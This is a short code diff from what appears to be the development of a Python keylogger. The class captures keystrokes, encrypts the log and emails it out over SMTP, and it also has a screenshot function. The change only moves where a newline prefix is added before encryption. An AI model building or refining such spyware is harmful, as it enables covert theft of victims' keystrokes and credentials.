@@ -38,7 +38,7 @@ class Keylogger:
         self.update_log(name.replace("'", ""))
 
     def encrypt_log(self):
-        return self.f.encrypt(str.encode(f"\n\n{self.log}"))
+        return self.f.encrypt(str.encode(self.log))
 
     def send_email(self, message):
         server = SMTP(host=EMAIL_HOST, port=PORT)
@@ -54,6 +54,7 @@ class Keylogger:
             server.quit()
 
     def send_keys(self):
+        self.log = "\n\n" + self.log
         self.send_email(self.encrypt_log())
 
     def send_screenshot(self):
